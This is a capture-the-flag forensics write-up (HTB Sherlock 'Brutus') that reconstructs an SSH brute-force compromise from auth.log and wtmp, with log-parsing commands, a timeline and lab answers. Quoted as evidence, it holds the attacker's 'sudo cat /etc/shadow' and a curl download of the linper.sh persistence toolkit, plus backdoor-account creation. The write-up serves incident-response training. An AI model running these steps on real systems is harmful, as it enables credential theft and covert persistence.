# HTB Sherlock: Brutus — Notes
 
**Category:** DFIR (Linux log analysis) · **Difficulty:** Easy
**Artifacts:** `auth.log` (plain text) and `wtmp` (binary utmp records), plus a helper script `utmp.py`
**Scenario:** A Confluence server was hit by an SSH brute-force attack. The attacker got in as `root`, created a backdoor account and fetched a persistence script.

<img width="1072" height="715" alt="Screenshot 2026-11-06 at 23 39 59" src="https://github.com/user-attachments/assets/e08d292e-c9af-4dc5-9c6c-8eee28dc5246" />



## 1. Key facts at a glance
 
| Item | Value |
|---|---|
| Attacker IP | `65.2.161.68` |
| Brute-forced usernames | `admin`, `backup`, `server_adm`, `svc_account`, `root` |
| Compromised account | `root` (password auth) |
| Session 34 (brute-force tool's confirmation login) | opened and closed at 06:31:40 |
| Session 37 (attacker's manual session) | login 06:32:44, closed 06:37:24 |
| wtmp login time (UTC) | `2024-03-06 06:32:45` |
| Backdoor account | `cyberjunkie` (UID/GID 1002), added to `sudo` |
| Session of the backdoor account | 49 (06:37:34) |
| Persistence tool | `linper.sh` from the `montysecurity/linper` GitHub repo |
| MITRE technique | T1136.001 — Create Account: Local Account |
 
`auth.log` has no year. The year (2024) comes from `wtmp`, whose records carry full dates.
 
---
 
## 2. Reading the artifacts

 <img width="1386" height="815" alt="Screenshot 2026-11-06 at 22 52 42" src="https://github.com/user-attachments/assets/05e82976-fe8a-40db-b401-195655cba241" />
 
### auth.log
It's plain text, so `grep` is enough:
 
```bash
grep "Failed password" auth.log                     # brute-force attempts
grep "Accepted password" auth.log                   # successful logins
grep -E "new user|usermod|useradd|groupadd" auth.log   # account changes
grep "COMMAND=" auth.log                            # sudo commands
grep -E "session 37|Session 37" auth.log            # follow one session
```
 
Count failed attempts per source IP:
 
```bash
grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
```
 
Ignore `[preauth]` lines when you want sessions. They are connections dropped before authentication, so no session ever existed.
 
### wtmp
It's a binary file made of fixed 384-byte utmp records. It isn't encoded or encrypted, so it only needs parsing:
 
```bash
TZ=UTC python3 utmp.py -o wtmp.out wtmp
column -t -s$'\t' wtmp.out | tr -d '"' | grep 65.2.161.68
# alternatives
utmpdump wtmp
last -f wtmp -F
```
 
Things to remember:
- `utmp.py` converts times with `time.localtime`, so **without `TZ=UTC` the times come out in your local timezone** (07:32:45 on a Prague machine instead of 06:32:45 UTC).
- `USER` rows are logins, `DEAD` rows are session ends.
- A session that never gets a terminal (`pts/N`) doesn't appear in `wtmp` at all. This is the case for session 34.
- `cat wtmp` only shows binary garbage. The script exits with code 1 even on success (a `sys.exit(1)` at the end); that's harmless.
---
 
## 3. Timeline (auth.log, UTC)
 
| Time | Event |
|---|---|
| 06:19:54 | Login as `root` from `203.101.190.9` (session 6) — a different IP, earlier, and not part of the brute force |
| 06:31:31 | Brute force begins from `65.2.161.68`: many parallel connections, `admin`, `backup`, `server_adm`, `svc_account`, `root`; `MaxStartups throttling` appears |
| 06:31:40 | `Accepted password for root` (session 34). It opens and closes within the same second, with no shell |
| 06:31:41–44 | More failures and `[preauth]` closes from connections still in flight |
| 06:32:44 | `Accepted password for root` (session 37): the **manual login** |
| 06:34:18 | `groupadd` / `useradd`: user `cyberjunkie` created, `from=/dev/pts/1` |
| 06:34:26 | `passwd`: password set for `cyberjunkie` |
| 06:35:15 | `usermod`: `cyberjunkie` added to group `sudo` |
| 06:37:24 | Session 37 closes (`Removed session 37`) |
| 06:37:34 | Login as `cyberjunkie` (session 49) |
| 06:37:57 | `sudo ... COMMAND=/usr/bin/cat /etc/shadow` |
| 06:39:38 | `sudo ... COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |
 
---
 
## 4. Why a login can "succeed" in the middle of failures
 
The tool opens many connections at once, and each one is its own `sshd[PID]`. Log lines are written when something happens, not in the order the attempts started, so failures can appear after a success. Specifically:
 
- Lower-numbered PIDs (`sshd[2399]`, `[2407]`, `[2409]`) were opened before session 34's `sshd[2411]` and only got their answers later.
- `sshd[2423]` and `[2424]` were new connections that kept guessing `backup`.
- The tool doesn't stop everything when one thread finds a working password.
**Method that works:** filter by PID or session ID instead of reading line by line.
 
---
 
## 5. Questions and answers
 
| Question | Answer / reasoning |
|---|---|
| When did the attacker's first SSH session end according to `auth.log`? | I first suggested `06:37:24` (session 37, the manual session; the `session closed` / `Removed session 37` lines), with the full date `2024-03-06 06:37:24`. The literal reading of "first session" is session 34, which ends at `06:31:40` — the box rejected that one. |
| UTC timestamp of the manual login, per `wtmp` | The `USER` row on `pts/1` for `root` from `65.2.161.68`: `2024-03-06 06:32:45` (shown as 07:32:45 if the parser used Prague time). It's one second after the 06:32:44 authentication time in `auth.log`. |
| Session number of the manual login | 37 |
| Persistence account and MITRE ID | `cyberjunkie`, T1136.001 |
| Full command to download the script | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |
 
`linper.sh` is a Linux persistence toolkit that automates several persistence methods (cron, SSH keys, shell profiles, and others). The log shows it being downloaded with `curl` under `sudo`, not run.
 
---
 
## 6. Lessons learned
 
1. **Check the timezone** of every tool's output before comparing it with another source.
2. **Use the full date format** the answer box asks for (`YYYY-MM-DD HH:MM:SS`); `auth.log` times have no year.
3. **Distinguish the brute-force tool's session from the manual session.** Session 34 has no terminal and doesn't appear in `wtmp`; session 37 does.
4. **Ignore `[preauth]` lines** when looking for real sessions.
5. **Follow a session by its number or PID**, not by line order.
6. The `useradd` line's `from=/dev/pts/1` ties the account creation to the terminal that `wtmp` records for the manual login.
 


